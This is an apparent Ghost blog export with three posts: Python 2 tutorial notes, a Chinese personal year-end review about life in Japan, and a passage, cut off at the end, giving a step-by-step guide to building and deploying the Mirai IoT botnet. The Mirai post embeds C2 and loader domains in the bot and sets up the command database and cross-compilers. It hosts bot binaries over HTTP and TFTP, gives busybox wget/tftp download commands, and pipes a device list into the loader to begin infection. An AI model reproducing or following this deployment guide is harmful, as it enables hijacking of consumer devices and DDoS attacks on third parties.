文はリストからスライスを除去したり、リスト全体を削除することもできます(以前はスライスに空のリストを代入して行っていました)。例えば以下のようにします:\n\n>>> a = [-1, 1, 66.25, 333, 333, 1234.5]\n>>> del a[0]\n>>> a\n[1, 66.25, 333, 333, 1234.5]\n>>> del a[2:4]\n>>> a\n[1, 66.25, 1234.5]\n>>> del a[:]\n>>> a\n[]\n>>> del a\n\n\n * シーケンスにわたるループを行う際、 enumerate()  関数を使うと、要素のインデックスと要素を同時に取り出すことができます。\n\n>>> for i, v in enumerate(['tic', 'tac', 'toe']):\n...     print i, v\n...\n0 tic\n1 tac\n2 toe\n\n\n * 二つまたはそれ以上のシーケンス型を同時にループするために、関数 zip()  を使って各要素をひと組みにすることができます。\n\n>>> questions = ['name', 'quest', 'favorite color']\n>>> answers = ['lancelot', 'the holy grail', 'blue']\n>>> for q, a in zip(questions, answers):\n...     print 'What is your {0}?  It is {1}.'.format(q, a)\n...\nWhat is your name?  It is lancelot.\nWhat is your quest?  It is the holy grail.\nWhat is your favorite color?  It is blue.\n\n\n * シーケンスを逆方向に渡ってループするには、まずシーケンスの範囲を順方向に指定し、次いで関数 reversed()  を呼び出します。\n\n>>> for i in reversed(xrange(1,10,2)):\n...     print i\n...\n9\n7\n5\n3\n1\n\n\n * シーケンスをソートされた順序でループするには、 sorted()  関数を使います。この関数は元の配列を変更せず、ソート済みの新たな配列を返します。\n\n>>> basket = ['apple', 'orange', 'apple', 'pear', 'orange', 'banana']\n>>> for f in sorted(set(basket)):\n...     print f\n...\napple\nbanana\norange\npear\n\n\n * ときどきループ内でリストを変更したい誘惑に駆られるでしょうが、代わりに新しいリストを作ってしまうほうがより簡単で安全なことが、ままあります\n\n>>> words = ['cat', 'window', 'defenestrate']\n>>> for w in words[:]:  # Loop over a slice copy of the entire list.\n...     if len(w) > 6:\n...         words.insert(0, w)\n...\n>>> words\n['defenestrate', 'cat', 'window', 'defenestrate']\n\n\n入力と出力\n * 2 乗と 3 乗の値からなる表を書く二つの方法を示します\n\n>>> for x in range(1, 11):\n...     print repr(x).rjust(2), repr(x*x).rjust(3),\n...     # Note trailing comma on previous line\n...     print repr(x*x*x).rjust(4)\n...\n 1   1    1\n 2   4    8\n 3   9   27\n 4  16   64\n 5  25  125\n 6  36  216\n 7  49  343\n 8  64  512\n 9  81  729\n10 100 1000\n\n>>> for x in range(1,11):\n...     print '{0:2d} {1:3d} {2:4d}'.format(x, x*x, x*x*x)\n...\n 1   1    1\n 2   4    8\n 3   9   27\n 4  16   64\n 5  25  125\n 6  36  216\n 7  49  343\n 8  64  512\n 9  81  729\n10 100 1000\n\n\n * もう一つのメソッド、str.zfill()  は、数値文字列の左側をゼロ詰めします。このメソッドは正と負の符号を正しく扱います\n\n>>> '12'.zfill(5)\n'00012'\n>>> '-3.14'.zfill(7)\n'-003.14'\n>>> '3.14159265359'.zfill(5)\n'3.14159265359'\n\n\n * str.format()\n\n>>> print 'We are the {} who say \"{}!\"'.format('knights', 'Ni')\nWe are the knights who say \"Ni!\"\n>>> print '{0} and {1}'.format('spam', 'eggs')\nspam and eggs\n>>> print '{1} and {0}'.format('spam', 'eggs')\neggs and spam\n>>> print 'This {food} is {adjective}.'.format(\n...       food='spam', adjective='absolutely horrible')\nThis spam is absolutely horrible.\n>>> print 'The story of {0}, {1}, and {other}.'.format('Bill', 'Manfred',\n...                                                    other='Georg')\nThe story of Bill, Manfred, and Georg.\n\n\nエラーと例外\n * 一つの try  文に複数の except \n   節を設けて、さまざまな例外に対するハンドラを指定することができます。同時に一つ以上のハンドラが実行されることはありません。ハンドラは対応する try \n   節内で発生した例外だけを処理し、同じ try  文内の別の例外ハンドラで起きた例外は処理しません。 except \n   節には複数の例外を丸括弧で囲ったタプルにして渡すことができます。このタプルの周囲の括弧は必要です。\n\n... except (RuntimeError, TypeError, NameError):\n...     pass\n\n\n * try ... except  文には、オプションで else  節 (else clause) を設けることができます。 else \n   節を設ける場合、全ての except  節よりも後ろに置かなければなりません。 else  節は try \n   節で全く例外が送出されなかったときに実行されるコードを書くのに役立ちます。\n\nfor arg in sys.argv[1:]:\n    try:\n        f = open(arg, 'r')\n    except IOError:\n        print 'cannot open', arg\n    else:\n        print arg, 'has', len(f.readlines()), 'lines'\n        f.close()\n\n\n * 定義済みクリーンアップ処理\n\nwith open(\"myfile.txt\") as f:\n    for line in f:\n        print line,\n\n\nLibrary\nlist\nL = range(1,5) #即 L=[1,2,3,4],不含最后一个元素\nL = range(1, 10, 2) #即 L=[1, 3, 5, 7, 9]\n\nlist的方法\nL.append(var) #追加元素\nL.insert(index,var)\nL.pop(var) #返回最后一个元素，并从list中删除之\nL.remove(var) #删除第一次出现的该元素\nL.count(var) #该元素在列表中出现的个数\nL.index(var) #该元素的位置,无则抛异常\nL.extend(list) #追加list，即合并list到L上\nL.sort() #排序\nL.reverse() #倒序\nlist 操作符:,+,*，关键字del\na[1:] #片段操作符，用于子list的提取\n[1,2]+[3,4] #为[1,2,3,4]。同extend()\n[2]*4 #为[2,2,2,2]\ndel L[1] #删除指定下标的元素\ndel L[1:3] #删除指定下标范围的元素\n\ndict\nD.get(key, 0) #同dict[key]，多了个没有则返回缺省值，0。[]没有则抛异常\nD.has_key(key) #有该键返回TRUE，否则FALSE\nD.keys() #返回字典键的列表\nD.values()\nD.items()\n\nD.update(dict2) #增加合并字典\nD.popitem() #得到一个pair，并从字典中删除它。已空则抛异常\nD.clear() #清空字典，同del dict\nD.copy() #拷贝字典\nD.cmp(dict1,dict2)\n\ntuple\ntuple = ('a', 'b', 'c', 'd', 'e')\n可以用list的 [],:操作符提取元素。就是不能直接修改元素。","feature_image":null,"featured":0,"page":0,"status":"published","locale":null,"visibility":"public","meta_title":null,"meta_description":null,"author_id":"1","created_at":"2016-12-09T05:39:45.000Z","created_by":"1","updated_at":"2017-04-15T10:04:30.000Z","updated_by":"1","published_at":"2016-12-09T05:41:46.000Z","published_by":"1","custom_excerpt":null,"codeinjection_head":null,"codeinjection_foot":null,"og_image":null,"og_title":null,"og_description":null,"twitter_image":null,"twitter_title":null,"twitter_description":null},{"id":"59bccd6bf9a5a920fc140c50","uuid":"013b41ff-6240-479a-a098-e12dc4795393","title":"2016年小总结和近期感受","slug":"xiaozongjie","mobiledoc":"{\"version\":\"0.3.1\",\"markups\":[],\"atoms\":[],\"cards\":[[\"card-markdown\",{\"cardName\":\"card-markdown\",\"markdown\":\"转眼间这一年就过去了，博客也撂荒了八个月，现在终于有时间来除草清理了。\\n\\n2016 年原本设定了两个目标，一个是日语，二个是健身。日语按部就班地上课，倒也混了一个马马虎虎的水准，健身找不到门道，自己摸索了三个月，终因暑期去帝都上课而暂停，进而彻底中断。\\n\\n原本想着趁 Gap Year 的时间较为自由写写博客，干点感兴趣的事情，没想到忙忙碌碌就这么过来了，回头看去，竟然想不出自己都忙了什么。\\n\\n来日本两个多月了，到年末正好三个月，也算是稍微安定下来了，终于找到点时间来打理这一方天地，把 VPS 换到了日本，更新了 Ghost 版本，换了一个更清新的主题，以后就配合工作定期更新吧。\\n\\n按国际惯例，先做个总结：\\n\\n##已完成事项\\n* 日语课程（大家的日语1，2，中级1），然而已忘记60%\\n* 健身3个月，然而长的肉又都消失了\\n* 渡航手续\\n* 登陆后各种住民证件和手续办理\\n* 入职手续\\n* 仓库实习\\n* 接待小伙伴来旅游\\n* 亲朋好友代购\\n* Mirai 源码分析\\n* 博客搬家，升级，更新\\n\\n##待办事项\\n* 日语学习\\n* 个人目标每月 Review\\n* 防灾手册确认，避难场所和避难路线确认\\n* 继续健身\\n* 学习 Pycharm 的使用\\n* 工作其他相关技术的学习\\n* 自己做饭和外边吃饭的成本对比\\n* 养老保险购买等级的 Review\\n* 定期更新博客\\n\\n待办的事情似乎不少，有的是短期的，有的是长期的，姑且算作2017 年准备做的事情吧。\\n\\n##三个月的感受\\n\\n如果说让我用最简练的语言来概括这几个月的生活有什么感受的话，我只能说：“**很舒服**”。舒服包括物质生活上的丰富和便利，以及精神生活上的放松和安逸。\\n\\n在物质的丰富程度和生活的便利程度上，以后可以多写几篇文章来描述，但归根到底也不过是一句话，毕竟是发达国家。超市里面逛一逛，商店街里面走一走，就能深刻理解政治教科书上的“物质生活的极大丰富”几个字。\\n\\n上周末需要办一个类似身份证的东西，提前预约好时间。骑车 10 分钟到市政府，10 分钟领完，10 分钟骑车回来，半小时搞完。家和公司距离一公里左右，平时骑车上班 10 分钟，下雨了就走路上班。日常生活需求，没遇到骑车 20 分钟车程搞不定的东西，事实上，刚来这儿没买自行车的时候，基本靠走路就搞定了。这种便利不是一句城市小人口少就能唬弄过去的，这必然是因为在城市规划上费了心思。\\n\\n工作的第一个月是在仓库搬砖，公司是电商公司，有物流仓库，第一个月就是入库，拣货，出库，捆包，倒也锻炼身体。之后就入组该干什么干什么。工作就是写网站的 API，但是氛围很好，不躁，也没人催你。这次 release 赶不上了，那就下次吧。告警是邮件通知，没人会在大晚上查问题，都是等第二天上班再说。总之，整体的节奏都是慢的，我这个月上班一共贡献了不到 100 行代码吧。\\n\\n日本人的工作方式和网游练级一样，有详细的升级计划，如何升级写的很清楚，慢慢打怪升级，一步一个脚印，这也是博客有一个个人目标链接的原因，每个月要被组长 Review，你打了多少怪，具体打的什么怪，正好就单开一个标签，放在这里了。\\n\\n公司对我们这些千里迢迢招来的员工还是很好的，能感觉到各方面的友善，目前日语还不太灵光，工作交流还是有障碍的。公司在找日语学校，准备让我们先去上上课，这大概就是日本公司的风格吧，不知道是不是终身雇佣制产生的惯性，即便是互联网企业，即便你可能转职走人，他也是把你当作自己人，能感觉到他是真的花成本在培养你。同期来的去另外一家公司的小伙伴更霸气些，他们公司直接出钱让他去学校上三个月的语言课，再来工作。\\n\\n工作也好，生活也罢，毕竟是一个回顾总结，不想多写了，也没时间细写。套用这里一个来日八年的同事的话，就是“很舒服”。\\n\\n未来会怎么样，真的是很难讲，人生没有上帝视角，虽然我费尽心力翻墙过来，但今天来这里究竟是不是一个正确的决定，目前其实我也不是完全确定，但是应该通过自己的努力，在若干年后，让它成为一个正确的决定。\"}]],\"sections\":[[10,0]]}","html":"<div class=\"kg-card-markdown\"><p>转眼间这一年就过去了，博客也撂荒了八个月，现在终于有时间来除草清理了。</p>\n<p>2016 年原本设定了两个目标，一个是日语，二个是健身。日语按部就班地上课，倒也混了一个马马虎虎的水准，健身找不到门道，自己摸索了三个月，终因暑期去帝都上课而暂停，进而彻底中断。</p>\n<p>原本想着趁 Gap Year 的时间较为自由写写博客，干点感兴趣的事情，没想到忙忙碌碌就这么过来了，回头看去，竟然想不出自己都忙了什么。</p>\n<p>来日本两个多月了，到年末正好三个月，也算是稍微安定下来了，终于找到点时间来打理这一方天地，把 VPS 换到了日本，更新了 Ghost 版本，换了一个更清新的主题，以后就配合工作定期更新吧。</p>\n<p>按国际惯例，先做个总结：</p>\n<h2 id=\"\">已完成事项</h2>\n<ul>\n<li>日语课程（大家的日语1，2，中级1），然而已忘记60%</li>\n<li>健身3个月，然而长的肉又都消失了</li>\n<li>渡航手续</li>\n<li>登陆后各种住民证件和手续办理</li>\n<li>入职手续</li>\n<li>仓库实习</li>\n<li>接待小伙伴来旅游</li>\n<li>亲朋好友代购</li>\n<li>Mirai 源码分析</li>\n<li>博客搬家，升级，更新</li>\n</ul>\n<h2 id=\"\">待办事项</h2>\n<ul>\n<li>日语学习</li>\n<li>个人目标每月 Review</li>\n<li>防灾手册确认，避难场所和避难路线确认</li>\n<li>继续健身</li>\n<li>学习 Pycharm 的使用</li>\n<li>工作其他相关技术的学习</li>\n<li>自己做饭和外边吃饭的成本对比</li>\n<li>养老保险购买等级的 Review</li>\n<li>定期更新博客</li>\n</ul>\n<p>待办的事情似乎不少，有的是短期的，有的是长期的，姑且算作2017 年准备做的事情吧。</p>\n<h2 id=\"\">三个月的感受</h2>\n<p>如果说让我用最简练的语言来概括这几个月的生活有什么感受的话，我只能说：“<strong>很舒服</strong>”。舒服包括物质生活上的丰富和便利，以及精神生活上的放松和安逸。</p>\n<p>在物质的丰富程度和生活的便利程度上，以后可以多写几篇文章来描述，但归根到底也不过是一句话，毕竟是发达国家。超市里面逛一逛，商店街里面走一走，就能深刻理解政治教科书上的“物质生活的极大丰富”几个字。</p>\n<p>上周末需要办一个类似身份证的东西，提前预约好时间。骑车 10 分钟到市政府，10 分钟领完，10 分钟骑车回来，半小时搞完。家和公司距离一公里左右，平时骑车上班 10 分钟，下雨了就走路上班。日常生活需求，没遇到骑车 20 分钟车程搞不定的东西，事实上，刚来这儿没买自行车的时候，基本靠走路就搞定了。这种便利不是一句城市小人口少就能唬弄过去的，这必然是因为在城市规划上费了心思。</p>\n<p>工作的第一个月是在仓库搬砖，公司是电商公司，有物流仓库，第一个月就是入库，拣货，出库，捆包，倒也锻炼身体。之后就入组该干什么干什么。工作就是写网站的 API，但是氛围很好，不躁，也没人催你。这次 release 赶不上了，那就下次吧。告警是邮件通知，没人会在大晚上查问题，都是等第二天上班再说。总之，整体的节奏都是慢的，我这个月上班一共贡献了不到 100 行代码吧。</p>\n<p>日本人的工作方式和网游练级一样，有详细的升级计划，如何升级写的很清楚，慢慢打怪升级，一步一个脚印，这也是博客有一个个人目标链接的原因，每个月要被组长 Review，你打了多少怪，具体打的什么怪，正好就单开一个标签，放在这里了。</p>\n<p>公司对我们这些千里迢迢招来的员工还是很好的，能感觉到各方面的友善，目前日语还不太灵光，工作交流还是有障碍的。公司在找日语学校，准备让我们先去上上课，这大概就是日本公司的风格吧，不知道是不是终身雇佣制产生的惯性，即便是互联网企业，即便你可能转职走人，他也是把你当作自己人，能感觉到他是真的花成本在培养你。同期来的去另外一家公司的小伙伴更霸气些，他们公司直接出钱让他去学校上三个月的语言课，再来工作。</p>\n<p>工作也好，生活也罢，毕竟是一个回顾总结，不想多写了，也没时间细写。套用这里一个来日八年的同事的话，就是“很舒服”。</p>\n<p>未来会怎么样，真的是很难讲，人生没有上帝视角，虽然我费尽心力翻墙过来，但今天来这里究竟是不是一个正确的决定，目前其实我也不是完全确定，但是应该通过自己的努力，在若干年后，让它成为一个正确的决定。</p>\n</div>","amp":"28","plaintext":"转眼间这一年就过去了，博客也撂荒了八个月，现在终于有时间来除草清理了。\n\n2016\n年原本设定了两个目标，一个是日语，二个是健身。日语按部就班地上课，倒也混了一个马马虎虎的水准，健身找不到门道，自己摸索了三个月，终因暑期去帝都上课而暂停，进而彻底中断。\n\n原本想着趁 Gap Year 的时间较为自由写写博客，干点感兴趣的事情，没想到忙忙碌碌就这么过来了，回头看去，竟然想不出自己都忙了什么。\n\n来日本两个多月了，到年末正好三个月，也算是稍微安定下来了，终于找到点时间来打理这一方天地，把 VPS 换到了日本，更新了 Ghost\n版本，换了一个更清新的主题，以后就配合工作定期更新吧。\n\n按国际惯例，先做个总结：\n\n已完成事项\n * 日语课程（大家的日语1，2，中级1），然而已忘记60%\n * 健身3个月，然而长的肉又都消失了\n * 渡航手续\n * 登陆后各种住民证件和手续办理\n * 入职手续\n * 仓库实习\n * 接待小伙伴来旅游\n * 亲朋好友代购\n * Mirai 源码分析\n * 博客搬家，升级，更新\n\n待办事项\n * 日语学习\n * 个人目标每月 Review\n * 防灾手册确认，避难场所和避难路线确认\n * 继续健身\n * 学习 Pycharm 的使用\n * 工作其他相关技术的学习\n * 自己做饭和外边吃饭的成本对比\n * 养老保险购买等级的 Review\n * 定期更新博客\n\n待办的事情似乎不少，有的是短期的，有的是长期的，姑且算作2017 年准备做的事情吧。\n\n三个月的感受\n如果说让我用最简练的语言来概括这几个月的生活有什么感受的话，我只能说：“很舒服”。舒服包括物质生活上的丰富和便利，以及精神生活上的放松和安逸。\n\n在物质的丰富程度和生活的便利程度上，以后可以多写几篇文章来描述，但归根到底也不过是一句话，毕竟是发达国家。超市里面逛一逛，商店街里面走一走，就能深刻理解政治教科书上的“物质生活的极大丰富”几个字。\n\n上周末需要办一个类似身份证的东西，提前预约好时间。骑车 10 分钟到市政府，10 分钟领完，10 分钟骑车回来，半小时搞完。家和公司距离一公里左右，平时骑车上班\n10 分钟，下雨了就走路上班。日常生活需求，没遇到骑车 20\n分钟车程搞不定的东西，事实上，刚来这儿没买自行车的时候，基本靠走路就搞定了。这种便利不是一句城市小人口少就能唬弄过去的，这必然是因为在城市规划上费了心思。\n\n工作的第一个月是在仓库搬砖，公司是电商公司，有物流仓库，第一个月就是入库，拣货，出库，捆包，倒也锻炼身体。之后就入组该干什么干什么。工作就是写网站的\nAPI，但是氛围很好，不躁，也没人催你。这次 release\n赶不上了，那就下次吧。告警是邮件通知，没人会在大晚上查问题，都是等第二天上班再说。总之，整体的节奏都是慢的，我这个月上班一共贡献了不到 100 行代码吧。\n\n日本人的工作方式和网游练级一样，有详细的升级计划，如何升级写的很清楚，慢慢打怪升级，一步一个脚印，这也是博客有一个个人目标链接的原因，每个月要被组长\nReview，你打了多少怪，具体打的什么怪，正好就单开一个标签，放在这里了。\n\n公司对我们这些千里迢迢招来的员工还是很好的，能感觉到各方面的友善，目前日语还不太灵光，工作交流还是有障碍的。公司在找日语学校，准备让我们先去上上课，这大概就是日本公司的风格吧，不知道是不是终身雇佣制产生的惯性，即便是互联网企业，即便你可能转职走人，他也是把你当作自己人，能感觉到他是真的花成本在培养你。同期来的去另外一家公司的小伙伴更霸气些，他们公司直接出钱让他去学校上三个月的语言课，再来工作。\n\n工作也好，生活也罢，毕竟是一个回顾总结，不想多写了，也没时间细写。套用这里一个来日八年的同事的话，就是“很舒服”。\n\n未来会怎么样，真的是很难讲，人生没有上帝视角，虽然我费尽心力翻墙过来，但今天来这里究竟是不是一个正确的决定，目前其实我也不是完全确定，但是应该通过自己的努力，在若干年后，让它成为一个正确的决定。","feature_image":null,"featured":0,"page":0,"status":"published","locale":null,"visibility":"public","meta_title":null,"meta_description":null,"author_id":"1","created_at":"2016-12-09T05:54:10.000Z","created_by":"1","updated_at":"2016-12-09T08:03:52.000Z","updated_by":"1","published_at":"2016-12-09T08:03:52.000Z","published_by":"1","custom_excerpt":null,"codeinjection_head":null,"codeinjection_foot":null,"og_image":null,"og_title":null,"og_description":null,"twitter_image":null,"twitter_title":null,"twitter_description":null},{"id":"59bccd6bf9a5a920fc140c51","uuid":"065ec7f3-2e82-495c-ab62-8ae4b67ed368","title":"Mirai 的安装配置和源代码分析","slug":"mirai-setup","mobiledoc":"{\"version\":\"0.3.1\",\"markups\":[],\"atoms\":[],\"cards\":[[\"card-markdown\",{\"cardName\":\"card-markdown\",\"markdown\":\"## Mirai 简介\\n\\nMirai 是一款恶意软件，它可以使运行 Linux 的计算系统成为被远程操控的“僵尸”，以达到通过僵尸网络进行大规模网络攻击的目的。Mirai的主要感染对象是可访问网络的消费级电子设备，例如网络监控摄像机和家庭路由器等。Mirai 的源代码已经以开源的形式发布至黑客论坛。（摘自维基百科）\\n\\nMirai 是目前可以通过公开渠道，或者说较为低成本的渠道，得到的最好的 DDOS 攻击工具之一，它的主要感染目标是物联网设备，由原作者在 Hackforum 论坛公开。原始帖子是 [World's Largest Net:Mirai Botnet, Client, Echo Loader, CNC source code release](https://hackforums.net/showthread.php?tid=5420472)，目前源码可以在 Github 上下载到：[Mirai Source Code](https://github.com/jgamblin/Mirai-Source-Code)\\n\\n此外，Mirai 一词是日语的“未来”，且原作者的网名是日语的“安娜前辈”，Mirai 是在 qbot 的基础上演变而来，做了相当大的提升和完善。\\n\\n## Mirai 的编译安装和配置\\n\\n在原始发布帖子中，作者给出了一份简单的安装指导，在 Github 源码上，也有同样的一份副本。\\n\\n### Mirai 的运行原理\\n在安装之前，先简要说明一下 Mirai 的整体运行原理，这有助于理解安装过程中，到底是在做些什么。\\n\\nMirai 是专门用于 DDOS 的僵尸网络工具，其所控制的僵尸机，主要是路由器，网络摄像头等物联网设备。Mirai 整体分为主控端，爆破消息接收器（scanListen），加载器（Loader），下载服务器等模块。\\n\\nMirai 运行时，受到感染的僵尸机会不断扫描网络，以暴力破解的方式，用内置的弱口令字典对网络上开启 Telnet 服务的设备进行尝试登陆，一旦成功，则将该设备信息上报给 scanListen，scanListen 将信息转交给 Loader，Loader 则使用收到的设备信息和对应的登陆口令登陆到该设备上，下载安装 bot 程序，之后，该设备就成为了受感染设备，并重新循环扫描，上报，下载病毒的过程。\\n\\n此外，设备受到感染后，会主动联系主控端，上报自身信息，完成上线，并保持心跳，以等待主控的攻击指令。\\n\\n### Mirai 的安装\\n\\n从运行原理和原帖的安装指导中不难看出，安装主要分为编译，主控安装，接收器加载器安装等几部分，本文以两台服务器为例，说明安装过程。一台服务器作为主控，另一台服务器作为加载器，接收器，以及下载服务器。后文有以下约定：\\n\\n* 主控服务器域名：`Master_domain`\\n* 主控服务器IP：`Master_IP`\\n* Loader服务器域名：`Loader_domain`\\n* Loader服务器IP：`Loader_IP`\\n\\n#### 修改源码配置 Bot\\n进入源码目录，首先先编译一下\\n<pre><code class=\\\"bash\\\">./build.sh debug telnet\\n</code></pre>\\n\\n有交叉编译的错误可以忽略，主要是将加密工具编译出来，用于加密字符串。之后运行：\\n<pre><code class=\\\"bash\\\">./debug/enc string Master_domain\\n./debug/enc string Loader_domain\\n</code></pre>\\n\\n将两个输出记录下来，修改 `./mirai/bot/table.c`\\n<pre><code class=\\\"c\\\">add_entry(TABLE_CNC_DOMAIN, \\\"\\\\x41...\\\", 30);\\nadd_entry(TABLE_SCAN_CB_DOMAIN, \\\"\\\\x50...\\\", 29);\\n</code></pre>\\n将两个域名的加密结果填到字符串里面。\\n\\n修改 `./mirai/cnc/main.go`\\n<pre><code>const DatabaseAddr string   = \\\"127.0.0.1\\\"\\nconst DatabaseUser string   = \\\"root\\\"\\nconst DatabasePass string   = \\\"password\\\"\\nconst DatabaseTable string  = \\\"mirai\\\"\\n</code></pre>\\n将数据库用户名和密码改成你自己要设定的密码，当然用默认的也可以，如果用默认的，则此处不需要修改。\\n\\n修改 `./dlr/main.c`\\n<pre><code>#define HTTP_SERVER utils_inet_addr(127,0,0,1)\\n</code></pre>\\n将 IP 修改为 Loader 服务器的 IP：`Loader_IP`\\n\\n修改 `./loader/src/main.c`\\n<pre><code>addrs[0] = inet_addr(\\\"192.168.0.1\\\");\\naddrs[1] = inet_addr(\\\"192.168.1.1\\\");\\n</code></pre>\\n这两个 IP 是 Loader 要绑定的 IP，将 IP 修改为 Loader 服务器的 IP：`Loader_IP`\\n<pre><code>if ((srv = server_create(sysconf(_SC_NPROCESSORS_ONLN), addrs_len, addrs, 1024 * 64, \\\"100.200.100.100\\\", 80, \\\"100.200.100.100\\\")) == NULL)\\n{\\n    printf(\\\"Failed to initialize server. Aborting\\\\n\\\");\\n    return 1;\\n}\\n</code></pre>\\n这两个 IP 分别是提供 HTTP 服务和 TFTP 服务的 IP，同样将 IP 修改为 Loader 服务器的IP：`Loader_IP`\\n\\n这里需要注意的是，如果你配置有单独的 HTTP 服务器或者 TFTP 服务器，那么 IP 要填写对应的服务器地址，我这里都一样是因为把这些服务都放在了一台服务器上。\\n\\n此时，针对此次配置需要的修改都已完成。\\n\\n#### 配置主控服务器和编译环境\\n\\n<pre><code class=\\\"bash\\\">\\napt-get install build-essential \\napt-get install mysql-server mysql-client\\n</code></pre>\\n数据库密码设定要和刚才的修改保持一致。进入数据库，建立需要的表。\\n<pre><code>\\nCREATE DATABASE mirai;\\nuse mirai\\n\\nCREATE TABLE `history` (\\n  `id` int(10) unsigned NOT NULL AUTO_INCREMENT,\\n  `user_id` int(10) unsigned NOT NULL,\\n  `time_sent` int(10) unsigned NOT NULL,\\n  `duration` int(10) unsigned NOT NULL,\\n  `command` text NOT NULL,\\n  `max_bots` int(11) DEFAULT '-1',\\n  PRIMARY KEY (`id`),\\n  KEY `user_id` (`user_id`)\\n);\\n\\nCREATE TABLE `users` (\\n  `id` int(10) unsigned NOT NULL AUTO_INCREMENT,\\n  `username` varchar(32) NOT NULL,\\n  `password` varchar(32) NOT NULL,\\n  `duration_limit` int(10) unsigned DEFAULT NULL,\\n  `cooldown` int(10) unsigned NOT NULL,\\n  `wrc` int(10) unsigned DEFAULT NULL,\\n  `last_paid` int(10) unsigned NOT NULL,\\n  `max_bots` int(11) DEFAULT '-1',\\n  `admin` int(10) unsigned DEFAULT '0',\\n  `intvl` int(10) unsigned DEFAULT '30',\\n  `api_key` text,\\n  PRIMARY KEY (`id`),\\n  KEY `username` (`username`)\\n);\\n\\nCREATE TABLE `whitelist` (\\n  `id` int(10) unsigned NOT NULL AUTO_INCREMENT,\\n  `prefix` varchar(16) DEFAULT NULL,\\n  `netmask` tinyint(3) unsigned DEFAULT NULL,\\n  PRIMARY KEY (`id`),\\n  KEY `prefix` (`prefix`)\\n);\\n\\nINSERT INTO users VALUES (NULL, 'username', 'password', 0, 0, 0, 0, -1, 1, 30, '');\\n</code></pre>\\n\\n其中 `username` 和 `password` 是将来登陆主控的口令，可以自己根据喜好设定。然后继续配置主控：\\n<pre><code>\\napt-get install golang\\napt-get electric-fence\\napt-get install git\\n\\nmkdir /etc/xcompile\\ncd /etc/xcompile\\n \\nwget https://www.uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-armv4l.tar.bz2\\nwget http://distro.ibiblio.org/slitaz/sources/packages/c/cross-compiler-armv6l.tar.bz2\\nwget https://uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-armv5l.tar.bz2\\nwget https://www.uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-i586.tar.bz2\\nwget https://www.uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-i686.tar.bz2\\nwget https://www.uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-m68k.tar.bz2\\nwget https://www.uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-mips.tar.bz2\\nwget https://www.uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-mipsel.tar.bz2\\nwget https://www.uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-powerpc.tar.bz2\\nwget https://www.uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-sh4.tar.bz2\\nwget https://www.uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-sparc.tar.bz2\\n \\ntar -jxf cross-compiler-armv4l.tar.bz2\\ntar -jxf cross-compiler-armv5l.tar.bz2 \\ntar -jxf cross-compiler-armv6l.tar.bz2 \\ntar -jxf cross-compiler-i586.tar.bz2\\ntar -jxf cross-compiler-i686.tar.bz2\\ntar -jxf cross-compiler-m68k.tar.bz2\\ntar -jxf cross-compiler-mips.tar.bz2\\ntar -jxf cross-compiler-mipsel.tar.bz2\\ntar -jxf cross-compiler-powerpc.tar.bz2\\ntar -jxf cross-compiler-sh4.tar.bz2\\ntar -jxf cross-compiler-sparc.tar.bz2\\n \\nrm *.tar.bz2\\nmv cross-compiler-armv4l armv4l\\nmv cross-compiler-armv5l armv5l\\nmv cross-compiler-armv6l armv6l\\nmv cross-compiler-i586 i586\\nmv cross-compiler-i686 i686\\nmv cross-compiler-m68k m68k\\nmv cross-compiler-mips mips\\nmv cross-compiler-mipsel mipsel\\nmv cross-compiler-powerpc powerpc\\nmv cross-compiler-sh4 sh4\\nmv cross-compiler-sparc sparc\\n\\nexport PATH=$PATH:/etc/xcompile/armv4l/bin/\\nexport PATH=$PATH:/etc/xcompile/armv5l/bin/\\nexport PATH=$PATH:/etc/xcompile/armv6l/bin/\\nexport PATH=$PATH:/etc/xcompile/i586/bin/\\nexport PATH=$PATH:/etc/xcompile/i686/bin/\\nexport PATH=$PATH:/etc/xcompile/m68k/bin/\\nexport PATH=$PATH:/etc/xcompile/mips/bin/\\nexport PATH=$PATH:/etc/xcompile/mipsel/bin/\\nexport PATH=$PATH:/etc/xcompile/powerpc/bin/\\nexport PATH=$PATH:/etc/xcompile/powerpc-440fp/bin/\\nexport PATH=$PATH:/etc/xcompile/sh4/bin/\\nexport PATH=$PATH:/etc/xcompile/sparc/bin/\\nexport GOPATH=$HOME/Documents/go\\n\\ngo get github.com/go-sql-driver/mysql\\ngo get github.com/mattn/go-shellwords\\n</code></pre>\\n\\n环境和主控的配置都已经完成，此时再次编译源代码，然后运行：\\n<pre><code class=\\\"bash\\\">./mirai/debug/cnc\\n</code></pre>\\n此时主控可以启动，登录时显示的是俄文，输入用户名和密码即可登陆。\\n#### 配置 Loader 服务器\\n\\nLoader 服务器上包括 HTTP，TFTP，接收器，加载器四个模块。将刚才编译出来的 scanListen，以及 loader 文件夹下和dlr文件夹下编译出来的对应文件拷贝到这台服务器即可。\\n\\n配置 HTTP\\n<pre><code class=\\\"bash\\\">aptitude install apache2\\n</code></pre>\\n在 apache 根目录建立`bins`文件夹，将编译出的不同平台的 bot 病毒放入，以供下载。\\n\\n配置 TFTP\\n<pre><code class=\\\"bash\\\">apt-get install -y tftpd-hpa\\nvim /etc/default/tftpd-hpa\\n\\nTFTP_USERNAME=\\\"tftp\\\"\\nTFTP_DIRECTORY=\\\"/tftpboot\\\"\\nTFTP_ADDRESS=\\\"0.0.0.0:69\\\"\\nTFTP_OPTIONS=\\\"--secure --create\\\"\\n\\nservice tftpd-hpa restart\\n</code></pre>\\nTFTP 的更多内容参见[这里](http://www.routingloops.co.uk/linux/tftp-on-ubuntu-14-04-lts-server/)，同样将病毒程序放入自己设置的 TFTP 根目录，以供下载。\\n\\n配置完毕后，在本机和另外一台机器上运行\\n<pre><code class=\\\"bash\\\">/bin/busybox wget http:Loader_IP:80/bins/mirai.ppc -O dvrHelper\\n/bin/busybox tftp -g -l dvrHelp -r mirai.ppc Loader_IP\\n</code></pre>\\n\\n运行成功则证明两个服务配置正确。如果此时手里有可供感染的设备列表的话，运行：\\n<pre><code class=\\\"bash\\\">cat file.txt | ./loader\\n</code></pre>\\n可以启动 Mirai。\\n## Mirai 的部分源码分析\\n\\nMirai 